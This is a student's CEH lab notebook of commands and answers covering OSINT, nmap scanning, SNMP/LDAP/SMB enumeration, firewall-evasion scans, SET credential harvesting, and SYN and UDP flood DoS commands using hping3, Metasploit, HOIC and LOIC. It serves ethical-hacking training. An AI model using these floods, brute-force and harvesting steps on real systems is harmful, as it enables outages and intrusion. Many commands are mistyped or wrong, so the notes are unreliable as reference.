https://youtu.be/DVy0mHQzT5U?si=LxOBv85PmXavHaI1

### 1. Use an advance Google hacking technique to find PDF files on the website www.eccouncil.org. Enter the compete URL of the CEH -   Brochure.pdf file
---
In google search 
`ec council filetype:pdf`

### 2. Search for  "Ec-Council certified Ethical Hacker (CEH)v11" on YouTube and perform a reverse image search on the Youtube video using YouTube Metadata (https://mattw.io/youtube-metadata/) video analysis tool. Enter the Video ID.
---
In YouTube search   `"ec-council certified ethical hacker (ceh)v11"`
Copy videos links
![[Pasted image 20241023220659.png]] 
Visit - https://mattw.io/youtube-metadata/ and **submit** the **copied link**.
And find the video id. Here you can also find reverse image search.
![[Pasted image 20241023221004.png]]

## Gather Information from FTP Search Engines
### 3. You want to use napalmftp FTP indexer to extract critical FTP information about target organization Microsoft enter yes if you find files located on the target FTP server else enter no.
---
Visit - https://www.searchftps.net and  search for microsoft

>**Ans  - YES**


## Task 4: Gather Information from IoT Search Engines
### 4. Use the Shodan search engine to search information about vulnerable iot devices in the target organization. - Amazon and yes if you find details of vulnerable iot devices
---
Visit - https://shodan.io and Search for Amazon
  ![[Pasted image 20241023230027.png]]
  > **Ans - YES**


## 5. Search for www.eccouncil.org on Netcraft and identify the operation system of the web server hosting the website on ec-council.org
---
Visit  sitereport.netcraft.com
![[Pasted image 20241024210247.png]]
ANS - Linux

## 6. Whtat is Satya Nadela's MBA's University name?
---
Visit https://www.peekyou.com
Search for Name.
**ANS = see on Wikipedia**

## 7. Use theHarvester tool to gather a list of email IS's related to Microsoft organization from the baidu search engines , enter the option that specifies the domain or company name to search.
---
heHarverser -d microsoft.com -l 200 -b baidu
theHarverser -d microsoft.com -l 200 -b google
theHarverser -d microsoft.com -l 200 -b linkedin

**ANS = -b** 

## 8. Use the Tor Browser to perform searches in the deep and darkweb identify the search engine Tor Browser uses to  perform darkweb search.
---
Open tor
**ANS - Duckduckgo**

## 9. Use census to perform passive footprinting on eccouncil.org.
---
Visit censys site
search for www.eccouncil.org
**Flag is not required**

## 10. 

theHarverser -d eccouncil.org -l 200 -b linkedin

## 11. Use Sherlock tool to gather all the URLs related to Satya nadella and enter the complete related to satya nadella that is obtain from the social networking site academia.edu.
---
cd sherlock
python3 sherlock.py satya nadella
![[Pasted image 20241025001925.png]]
**Ans** - https://independent.academia.edu/satya

## 12. Use the follower wonk online tool to gather Twitter information about Satya nadella. What is the rating follower won uses to rate the user's influence and engagement on Twitter.
---
**Ans - Social Authority**

## 13. Use the ping command line utility to test the reachability of the website www.eccouncil.org identify the maximum packet frame size on the machine network 
ping www.certifiedhacker.com
ping www.certifiedhacker.com -f -l 1500 -not working
ping www.certifiedhacker.com -l 1500
ping www.certifiedhacker.com -l 65500
ping www.eccouncil.org -f -l 1450 - working
ping www.eccouncil.org -f -l 1480 - not working
ping www.eccouncil.org -f -l 1470 - working
ping www.eccouncil.org -f -l 1471 - working
ping www.eccouncil.org -f -l 1472 - working
ping www.eccouncil.org -f -l 1473 -not working

**AND - 1472**

## 14.
ping www.certifiedhacker.com -i 3          #i------ttl_value
ping www.certifiedhacker.com -i 2 -n 1   #n------number_of_packet
ping www.certifiedhacker.com -i 3 -n 1
ping www.certifiedhacker.com -i 1 -n 1 
ping www.certifiedhacker.com -i 20 -n 1
ping www.certifiedhacker.com -i 21 -n 1


## 17. Use the web data extrator web spidering tool gather the target company's data for certifiedhacker.com. Enter email id of the support department.
---
![[Pasted image 20241025012400.png]]ANS - support@infospire.web

## 18. Use httrack website copier to mirror the entire website of certifiedhacker.com then you have to enter newly created HTML file name which allows you to view the webpage of the mirrored website on any browser.
---
Open Winhttrack on windows.
next
project name - test project
next
url - www.certifiedhacker.com

**ANS - index.html**

## 19. 
sudo su
cd grecon
python3 grecon.py
certifiedhacker.com

## 20. Enter the command which allows you to gather a unique wordlist from the target website with a minimum word length of six and the depth of three to spider the target website .
---
cewl -d 2 -m 5 www.certifiedhacker.com
cewl -w wordlist.txt -d 2 -m 5 www.certifiedhacker.com

**ANS** - cewl -3 -m 6 www.certifiedhacker.com

## 21. 

## 22. Perform whois lookup using domain tools and find the registar of the website www.certifiedhacker.com .
---
Visit http://whois.domaintools.com
enter www.certifiedhacker.com
![[Pasted image 20241025014851.png]]
ANS - http://networksolutions.com

## 23. Use NSlookuup command line utility to find primary server of the domain certifiedhacker.com
---
nslookup
set type=a 
www.certifiedhacker.com
set type=cname
www.certifiedhacker.com
set type=a
ns1.bluehost.com 

open www.kloth.net/service/nslookup.php
domain - www.certifiedhacker.com
Look it up


## 24. Perform a reverse DNS lookup using DNS Recon on the IP addresses and locate the pointer record.
http://yougetsignal.com
remote address - www.certifiedhacker.com
check
Terminal
cd dnsrecon
chmod +x ./dnsrecon.py
./dnsrecon.py -r 162.241.216.0-162.241.216.255  # get ip for upper scan and scan its range

## 25. Use security trails to gather information regarding subdomains   and DNS records of certifiedhacker.com 
---
https://securitytrails.com
search certifiedhacker.com

## 26. use arin database search tools to locate the range of the target organization 
---
visit www.arin.net
search 162.241.214.255

## 27. Perform Network trace routing using traceroute and enter the ip address of target domain.
---
tracert www.certifiedhacker.com
pathping www.certifiedhacker.com -- slow 10- 15 min
tracert -h 5 www.certifiedhacker.com
traceroute www.certifiedhacker.com

## 28. 
---
recon-ng
help
marketplace install all
module search
workspaces
workspaces create RedCEH
workspaces list
db insert domains
certifiedhacker.com
Enter
show domains
modules load brute
modules load recon/domains-hosts/brute_hosts
run
back
modules load recon/domains-hosts/bing_domain_web
run
modules load reverse_resolve
modules load recon/hosts-hosts/reverse_resolve
run
show hosts
back
modules load reporting
modules load reporting/html
options set FILENAME /home/attacker/Desktop/results.html
options set CREATOR RedKohler
options set CUSTOMER Certifiedhacker Network
run


recon-ng
workspaces create reconn
modules load recon/domains-contacts/whois pocs
info command
options set SOURCE facebook.com
run
back
modules load recon/profiles-profiles/profiler
options set SOURCE MarkZuckerberg
run


recon-ng
modules load recon/domains-hosts/hackertarget
options set SOURCE certifiedhacker.com 
run

## 29.
 see your ip  ifconfig
 nmap -sn -PR 192.168.0.108    # TCP
 nmap -sn -PU 192.168.0.108     # UDP
 nmap -sn -PE 192.168.0.108     # ICMP
 nmap -sn  -PE 19.168.0.0/24
 nmap -sn -PP 192.168.0.108
 nmap -sn -PM 192.168.0.108
 nmap -sn PS 192.168.0.108
 nmap -sn -PA 192.168.0.108
 nmap -sn -PO 192.168.0.108

## 30. 
open Angry IP scanner
preferences
scanning > ping method - combined TCP and UDP 
display > Alive hosts 
OK
start scan

# 31. Identify how many of the live hosts are available between the IP addresses of 10.10.1.2 through 23
---
>nmap scan to see live hosts 

nmap -sn -PE 10.10.1.2-23
![[Pasted image 20241025105243.png]]
**ANS - 6**

nmap -sn www.moviescope.com
![[Pasted image 20241025105335.png]]
ANS -10.10.1.19

> Perform port discovery using megaping and name the service running on poprt 445 on the windows Server 2022 machine 

open **megaping** on windows.
IP Scanner
From - 10.10.1.5
To - 10.10.1.30
Port Scanner
Destination address list - 10.10.1.22 
![[Pasted image 20241025105943.png]]ANS - Microsoft DS

> Perform port discovery and find the ip address of the machine with an open FTP port

All all 6 ips in Destination address list in megaping 

nmap -p 21 10.10.1.0/24


## 32.
open netscantools pro
in manual tools > ping scanner
start ip - 10.10.1.5
end ping - 10.10.0.20
use  Default System DNS
Start

port Scanner
Target - 10.10.1.22

Use netscanntools pro to identify the port using epmap service  
![[Pasted image 20241025110920.png]]
**ANS - 135**

## 33. User the sx tool to perform ARP scan TCP scan UDP scan to discover open ports on windows 11 machine .Enter the option that specifies the Target Port while Performing UDP scan.

sx arp 10.10.1.0/24
![[Pasted image 20241025111204.png]]
sx arp 10.10.1.0/24 --json | tee arp.cache
cat crp.cache | sx tcp-p 1-65535 10.10.1.11
![[Pasted image 20241025111215.png]]
cat crp.cache | sx udp --json -p 53 10.10.1.11
cat crp.cache | sx udp --json -p 500 10.10.1.11
![[Pasted image 20241025111405.png]]
>**ANS - -p**

## 34. Perform nmap scan to identify service running port 636 in windows server 2022.

nmap -sT -v 10.10.1.22

>Turn on the windows 2022 firewall.

nmap -sS -v 10.10.1.22

Mayman scan
nmap -mM -v 10.10.1.22
ACK flag pro scan 

>turn off windows 2022 firewall

nmap -sU -v 10.10.1.22  

null scan 
nmap -sN -T4 -v 10.10.1.22

nmap -sV -T4 10.10.1.22
**ANS- tcwrapper**

aggrasive scan 
nmap -A 10.10.1.*

## 35. 
hping3 -A 10.10.1.22 -p 80 -c 5
hping3 8 0-100 -S 10.10.1.22 -V
hpiing3 -FUP -p 80 -c 5 10.10.1.22
hping3 --scan 0-100 -S 10.10.1.22
hping3 -1 10.10.1.22 -o 80 -c 5

hping3 8 0-100 -S 10.10.1.22 -V
![[Pasted image 20241025135323.png]]
**AND - systat**

## 36. Identify target OS operation system using wireshark. 
tcp window size
![[Pasted image 20241025141806.png]]
start wireshark capturing.
ping 10.10.0.22

## 37. Identify target OS operation system using nmap.
---
nmap -A 10.10.1.22
nmap -O 10.10.1.22     # not always perfect
nmap --script smb-os-discovery.nse 10.10.1.22

## 38. Identify target OS operation system using unicornscan.
---
unicornscan -Iv 10.10.1.22    # ttl=128 so it will we windows

## 39. scan beyond ids/firewall using various evasion techniques
---
turn firewall turn on 
open wireshark
nmap -f {windows ip}  # -f fragmented
nmap -g 80 {windows ip} # -g = source port
nmap -mtu 8 {windows ip} # -mtu maximum transmission unit 8= 8 bits
nmap -D RND:10.10.1.11  
nmap -sT -Pn ---spoof-mac 0 10.10.1.11 
-sT = perform the TCP connect/full open scan
-Pn skip the host discovery

## 40. create custom packets using  Colasoft Packet Builder to scan beyond the IDS/Firewall
---
open wireshark in server
open colasoft packet builder
select adapter
Add
ok
send 
ok
back to wireshark
filter arp

#### create custom udp and tcp packet using hping3 to scan beyond the IDS/Firewall
create udp packet
`hping3 10.10.1.11 --udp --rand-source --data 500`

create tcp packet
`hping3 -S 10.10.1.11 -p 80 -c 5`
-S = TCP SYN
-c = count of the packets

`hping3 10.10.1.11--flood`
## 41. 
---
service postgresql start
msfconsole
db_status
exit
msfdb init
service postgresql restart
msfconsole
db_status
nmap -Pn -sS -A -oX Test 10.10.1.0/24
db_import Test
hosts
db_services
search portscan
use  auxiliary/scanner/portscan/syn
set interface eth0
set port 80
set rhosts 10.10.1.5-23
set threads 50
run
use auxiliary/scanner/portscan 
hosts -R
set RHOSTS 10.10.1.22
run
back
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.1.23
run

## 42. netbios enumaration
windows
nbtstat -a 10.10.1.11 
nbtstat -c


## 43.
open NetBIOS Enumerator
from - 10.10.1.15
to - 10.10.1.100

## 44.
nmap -sV -v --script nbstat.nse 10.10.1.22
nmap -sU -p 137 --script nbstat.nse 10.10.1.22

## 45. snmp
nmap-sU -p 161 10.10.1.22   #opened
snmp-check 10.10.1.22
 
## 46. softperfect network scanner
---
open network scanner
check all
ok
enter range

## 47. 
snmpwalk -v1 -c public 10.10.1.22
snmpwalk -v2 -c public 10.10.1.22
 -v = snmp version (1,2,3)
 -c = sets a community string
 
## 48.
nmap -sU -p 161 --script=snmp-sysdescr 10.10.1.22
nmap -sU -p 161 --script=snmp-processes 10.10.1.22
nmap -sU -p 161 --script=snmp-win32-software 10.10.1.22
nmap -sU -p 161 --script=snmp-interfaces 10.10.1.22

## 49. ldap
open activedirectoryexplorer.exe
connect to 10.10.1.22

## 50. ldap
---
nmap -sU -p 389 10.10.1.22
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' 10.10.1.22
python3 
import ldap3
server = ldap3.Server('10.10.1.22',get_info-ldap3.ALL,port=389)
connection-ldap3.Connection(server)
connection.bind()
 server.info 
 ![[Pasted image 20241025151953.png]]
 `connection.search(search_base='DC=CEH,DC=com' ,search_filter='(&(objectclass=*))',search_scope='SUBTREE',attributes='*')`
 ![[Pasted image 20241025152329.png]]
 connection.entries

 `connection.search(search_base='DC=CEH,DC=com' ,search_filter='(&(objectclass=person))',search_scope='SUBTREE',attributes='userpassword')`
 connection.entries
 ![[Pasted image 20241025152519.png]]

## 51.
ldapsearch -h
ldapsearch -h 10.10.1.22 -x -s base namingcontexts
ldapsearch -h 10.10.1.22 -x -b "DC=CEH,DC=com"
`ldapsearch -h 10.10.1.22 -x -b "DC=CEH,DC=com" "objectclass=*"`

## 52. nfs enumeration
---
RPCScan
python3 rpc-scan.py --rpc 10.10.1.19


nmap -p 2049 10.10.1.19
cd  /SuperEnum
 echo '10.10.1.19' > target.txt
 ./superenum
 target.txt

## 53. dns enumeration
---
> dns zone transfer

dig ns www.certifiedhacker.com
dig @ns1.bluehost.com www.certifiedhacker.com axfr
![[Pasted image 20241025163731.png]]
Failed so zone transfer is not allowed


open win 11
nsloopup
set querytype=soa
certifiedhacker.com
ls -d ns1.bluehost.com
![[Pasted image 20241025163930.png]]
here also failed so zone transfer is not allowed

## 54.
./dnsrecon .py -d www.certifiedhacker.com -z

## 55.
nmap --script=broadcast-dns-service-discovery certifiedhacker.com  # find rdns
nmap -T4 -p 53 --script dns-brute certifiedhacker.com
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='certifiedhacker.com'"

## 56. SMTP enumeration
---
nmap -p 25 --script=smtp-enum-users 10.10.1.19   
nmap -p 25 --script=smtp-open-relay 10.10.1.19
nmap -p 25 --script=smtp-commands 10.10.1.19  # all  available commands on smtp

## 57. rpc enumaration
---
win 11 
open netscantool pro 
start demo >manual tool > smb scanner
start smb scanner
srat the demo
hostname - 10.10.1.19 
add to list
ok
edit share login credentials
username - Administrator
pass - `Pas$$word`
ok
get smb version


manual tools> `*nix RPC Info`
target - 10.10.1.19
dump portmap


## 58.configuring ftp port
---
SERVER
create folder named FRP-Site Data
open IIS Manager
![[Pasted image 20241025175135.png]]
Click on Server2019 > rightclick on Sites> Add FRP Site...
![[Pasted image 20241025175233.png]]
![[Pasted image 20241025175247.png]]
![[Pasted image 20241025175315.png]]
![[Pasted image 20241025175326.png]]

nmap -p  21 10.10.1.19
namp -T4 -A 10.10.1.19
nmap -p 445 -A 10.10.1.19
nmap -p 21 -A 10.10.1.19


## 59. Open Global Network
open global network inventory
single ip scan 
next
name - 10.10.1.22
next
connect as > username = Administrator , Password = `Pa$$word`
next
finish

## 60. Advance IP Scanner
open advance ip scanner
ip - 10.10.1.5-23

## 61. enum4linux 
enum4linux -u martin -p apple -n 10.10.1.22
enum4linux -u martin -p apple -U 10.10.1.22  # U user list  |  RID = Relative ID
enum4linux -u martin -p apple -o 10.10.1.22  # OS operating information  | platform id | server type
enum4linux -u martin -p apple -P 10.10.1.22  # password policy
enum4linux -u martin -p apple -G 10.10.1.22 # Group information
enum4linux -u martin -p apple -S 10.10.1.22  # share list


## 62. Perform
open https://cwe.mitre.org

## 63. 
open https://cve.mitre.org

## 64.
https://nwd.nist.gov

## 65. OpenVAS 
Application>Pentesting>Vulnarability Analysis>Openvas - greenbone>Start Greenbone Vulnerability Management Service
https://127.0.0.1:9392
admin
password

## 66. Nessus
http://localhost:8834/
admin
password
policy > create new policy > advance scan
name - anything

## 67. GFI LanGuard


## 68. Armitage
service postgresql start
Pentesting > Ecploitation tools> Metasploit Framework > armitage


## 69. Nikto
nikto -h
nikto -h www.certifiedhacker.com -Tuning x   # x = Reverse tuning Option
nikto -h www.certifiedhacker.com -Cgidirs all 

osvdb
host-name

nikto -h www.certifiedhacker.com -o results -F txt


## 76. 
map drive `windows11\\ceh-tools`


## 90. Sniff Credentials using the Social-Engineer Toolkit(SET)
---
sudo su 
settoolkit
yes
5
1
![[Pasted image 20241026000631.png]]
 2
![[Pasted image 20241026000650.png]]
3
![[Pasted image 20241026000822.png]]
2
![[Pasted image 20241026000839.png]]
enter
http://www.moviescope.com
![[Pasted image 20241026000917.png]]


## 91. Detect Phishing using Netcraft
---



## 92. Detect Phishing using PhishTank
---




## 93. Audit Organization's Security for Phishing Attacks using OhPhish
---



## 94. Perform DoS Attack(SYN Flooding ) on a Target Host with Metasploit
-- -
1. msfconsole
2. use auxiliary/dos/tcp/synflood
3. set rhost {target}
4. set rport {target_port_number}
5. set SHOST {fake IP address to show target from where packets are comming}
6. exploit

## 95. Perform a DoS Attack on the target host using hping3
---
1. hping3 -S 10.10.1.11 -a 10.10.1.19 -p 22 --flood
	hping3 -S {target_ip} -a {spoofed IP} -p {target port}  -flood

2. hping3 -d 65538 -S -p 21 --flood 10.10.1.11
	hping3 -d {packet size} -S -p {target port} --flood {target IP}

**UDP application layer flood attack on the Windows Server 2019 using NetBIOS port 139.**
3. hping3 -2 -p 139 --flood 10.10.1.19
	hping3 -2{specifies UDP mode} -p {target port} --flood {target IP}

## 96. Perform a DoS Attack using Raven-storm
---

**Linux**
1. sudo su
2. sudo rst
3. -l4
4. ip 10.10.1.19
5. port 80
6. threads 20000
7. run
8. y

## 97. Perform a DDoS Attack using HOIC
---
It is design to attack 256 target simultaneously.
1. open High Orbit Ion Cannon(HOIC). folder in win
2. open hoic.exe
3. click '+' button
4. ![[Pasted image 20241026011910.png]]

## 98. Perform a DDoS Attack using LOIC
---
1. open LOIC.exe
2. ![[Pasted image 20241026012209.png]]
3. ![[Pasted image 20241026012224.png]]


## 99. Detect  and  Protect Against DDoS Attacks using Anti DDoS Guardian




## 100. Gather Information using Online Footprinting Tools
---



## 101. Capture and Analyze IoT Traffic using Wireshark
---


## 102. Enumerate S3 Bucket using lazys3
---
1. sudo u
2. cd lazy3-master/
3. ruby lazys3.rb
4. ruby lazys3.rb HackerOne  

## 103. Enumerate S3 Bucket using S3Scanner
---
1. cd S3Scanner
2. pip3 install -r requirements.txt
3. python3 ./s3scanner.py sites.txt   # site.txt contain list of websites
## 104. Exploit Open S# Buckets using AWS CLI
---
1. sudo su 
2. cd
3. pip3 install awscli
4. aws --help
5. aws configure
6. see video


## 105.Escalate IAM User Privilages by Exploiting Misconfigured User Policy
---








# Module 7 - Malware Threats
---
## Task 1: Gain control over a Victim Machine using the njRAT RAT trojan
---
LAB Manual 2 - Page. 914


## Task 2: Hide a Trojan using SwayzCryptor and Make it Undetectable to Various Anti-Virus Program
---
LAB Manual 2 -Page. 931


## Task 3: Create  a Trojan Server using Theef RAT Trojan
---
LAB Manual 2 - Page. 942


## Task 1: Create a Virus using the JPS Virus Maker Tool and Infect the Target System
---
LAB Manual 2 - Page. 951


## Task 1: Perform Malware Scanning using Hybrid Analysis
---
LAB Manual 2 - Page. 962



## Tash2: Perform a String earch using BinText
---

![[Pasted image 20241027202216.png]]

![[Pasted image 20241027202238.png]]

![[Pasted image 20241027202257.png]]
LAB Manual 2 - Page.973

## Task 3: Identify Packaging and Obfuscation Methods using PEid
---
![[Pasted image 20241027202923.png]]

![[Pasted image 20241027202949.png]]

Entrypoint
file offset
linker info 
ep section
first bytes
subsystem

**LAB Manual 2 - Page.977**

## Task 4: Analyze ELF Executable File using Detect It Easy (DIE) Detect it easy
---
 **Lab Manual 2 - Page.979**
 file info  - file name , size, os
 mime
 hash
 storage
 entropy
 hex
 signatures
 demangle


## Task 5: Find the Portable Executable (PE) Information of a Malware Executable File using PE Explorer
---
**LAB Manual 2 - Page.983**
![[Pasted image 20241027204602.png]]
![[Pasted image 20241027204626.png]]


## Task 6: Identify File Dependencies using Dependency Walker
---
**LAB Manual 2 - Page.989**
![[Pasted image 20241027205019.png]]


## Task 7: Perform Malware Disassembly using IDA and OllyDbg
---
**LAB Manual 2 - Page.993**

## Task 8: Perform Malware Disassembly using Ghidra
---
LAB Manual 2 - Page.1012



## Task 1: Perform Port Monitoring using TCPView and CurrPorts
---
**Lab Manual 2 - Page.1024**


## Task 2: Perform Process Monitoring using Process Monitor
---

**LAB Manual 2 - Page. 1039**
Procmon.exe


## Task 3: Perform Registry Monitoring using Reg Organizer
---
Comparing two images, snapshot
reg organizer setup.exe
netscan setup.exe
**LAB Manual 2 - Page.1045**

## Task 4: Perform Windows Services Monitoring using Windows Service Manager (SrvMan)
---
**LAB Manual 2 - Page.1053**

Internal name, State, Type, Display name, Start type, Executable.


## Task 5: Perform Startup Program Monitoring using Autoruns for Windows and WinPatrol
---
**LAB Manual 2 - Page.1056**

Autoruns.exe


## Task 6: Perform Installation Monitoring using Mirekusoft Install Monitor
---
**LAB Manual 2 - Page.1065**


## Task 7: Perform Files and Folder Monitoring using PA File Sight
---
**LAB Manual 2 - Page.1071**


## Task 8: Perform Device Driver Monitoring using DriverView and Driver Reviver
---
**LAB Manual 2 - Page.1090**


## Task 9: Perform DNS Monitoring using DNSQuerySniffer
---
**LAB Manual 2 - Page.1095**
DNSQuerySniffer

